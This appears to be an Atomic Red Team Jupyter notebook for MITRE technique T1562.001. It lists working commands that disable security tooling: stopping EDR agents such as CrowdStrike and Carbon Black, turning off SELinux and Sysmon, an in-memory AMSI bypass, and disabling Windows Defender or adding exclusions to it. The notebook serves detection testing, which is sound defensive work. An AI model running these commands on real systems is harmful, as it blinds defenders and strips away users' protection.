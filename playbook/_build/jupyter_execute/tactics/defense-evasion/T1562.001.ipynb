{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1562.001 - Impair Defenses: Disable or Modify Tools\n",
    "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\n",
    "Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Disable syslog\n",
    "Disables syslog collection\n",
    "\n",
    "**Supported Platforms:** linux\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\n",
    "then\n",
    "  service rsyslog stop\n",
    "  chkconfig off rsyslog\n",
    "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n",
    "  systemctl stop rsyslog\n",
    "  systemctl disable rsyslog\n",
    "fi\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Disable Cb Response\n",
    "Disable the Cb Response service\n",
    "\n",
    "**Supported Platforms:** linux\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\n",
    "then\n",
    "  service cbdaemon stop\n",
    "  chkconfig off cbdaemon\n",
    "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n",
    "  systemctl stop cbdaemon\n",
    "  systemctl disable cbdaemon\n",
    "fi\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Disable SELinux\n",
    "Disables SELinux enforcement\n",
    "\n",
    "**Supported Platforms:** linux\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "setenforce 0\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Stop Crowdstrike Falcon on Linux\n",
    "Stop and disable Crowdstrike Falcon on Linux\n",
    "\n",
    "**Supported Platforms:** linux\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "sudo systemctl stop falcon-sensor.service\n",
    "sudo systemctl disable falcon-sensor.service\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Disable Carbon Black Response\n",
    "Disables Carbon Black Response\n",
    "\n",
    "**Supported Platforms:** macos\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable LittleSnitch\n",
    "Disables LittleSnitch\n",
    "\n",
    "**Supported Platforms:** macos\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Disable OpenDNS Umbrella\n",
    "Disables OpenDNS Umbrella\n",
    "\n",
    "**Supported Platforms:** macos\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Stop and unload Crowdstrike Falcon on macOS\n",
    "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
    "\n",
    "**Supported Platforms:** macos\n",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n",
    "sudo launchctl unload #{falcond_plist}\n",
    "sudo launchctl unload #{userdaemon_plist}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 8"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Unload Sysmon Filter Driver\n",
    "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\n",
    "run the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "fltmc.exe unload #{sysmon_driver}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 9"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Uninstall Sysmon\n",
    "Uninstall Sysinternals Sysmon for Defense Evasion\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "sysmon -u\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 10"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - AMSI Bypass - AMSI InitFailed\n",
    "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\n",
    "Upon execution, no output is displayed.\n",
    "\n",
    "https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 11"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - AMSI Bypass - Remove AMSI Provider Reg Key\n",
    "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\n",
    "This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\n",
    "Open Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 12"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Disable Arbitrary Security Windows Service\n",
    "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\n",
    "Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\n",
    "To verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "net.exe stop #{service_name}\n",
    "sc.exe config #{service_name} start= disabled\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 13"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Tamper with Windows Defender ATP PowerShell\n",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\n",
    "in Windows settings.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "Set-MpPreference -DisableRealtimeMonitoring 1\n",
    "Set-MpPreference -DisableBehaviorMonitoring 1\n",
    "Set-MpPreference -DisableScriptScanning 1\n",
    "Set-MpPreference -DisableBlockAtFirstSeen 1\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 14"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - Tamper with Windows Defender Command Prompt\n",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\n",
    "However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\n",
    "will be displayed twice and the WinDefend service status will be displayed.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "sc stop WinDefend\n",
    "sc config WinDefend start=disabled\n",
    "sc query WinDefend\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 15"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - Tamper with Windows Defender Registry\n",
    "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\n",
    "grayed out and have no info.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 16"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Disable Microsoft Office Security Features\n",
    "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\n",
    "show any warning before editing the document.\n",
    "\n",
    "\n",
    "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\n",
    "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\n",
    "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\n",
    "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\n",
    "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
    "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
    "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 17"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Remove Windows Defender Definition Files\n",
    "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\n",
    "On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\n",
    "command will say completed.\n",
    "\n",
    "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n",
    "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 18"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Stop and Remove Arbitrary Security Windows Service\n",
    "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "Stop-Service -Name #{service_name}\n",
    "Remove-Service -Name #{service_name}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 19"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Uninstall Crowdstrike Falcon on Windows\n",
    "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Tamper with Windows Defender Evade Scanning -Folder\n",
    "Malware can exclude a specific path from being scanned and evading detection. \n",
    "Upon successul execution, the file provided should be on the list of excluded path. \n",
    "To check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "$excludedpath= \"#{excluded_folder}\"\n",
    "Add-MpPreference -ExclusionPath $excludedpath```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 21"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Tamper with Windows Defender Evade Scanning -Extension\n",
    "Malware can exclude specific extensions from being scanned and evading detection. \n",
    "Upon successful execution, the extension(s) should be on the list of excluded extensions.\n",
    "To check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "$excludedExts= \"#{excluded_exts}\"\n",
    "Add-MpPreference -ExclusionExtension  $excludedExts```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 22"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Process\n",
    "Malware can exclude specific processes from being scanned and evading detection.\n",
    "Upon successful execution, the process(es) should be on the list of excluded processes. \n",
    "To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
    "\n",
    "**Supported Platforms:** windows\n",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n",
    "$excludedProcess = \"#{excluded_process}\"\n",
    "Add-MpPreference -ExclusionProcess $excludedProcess```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1562.001 -TestNumbers 23"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection\n",
    "Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}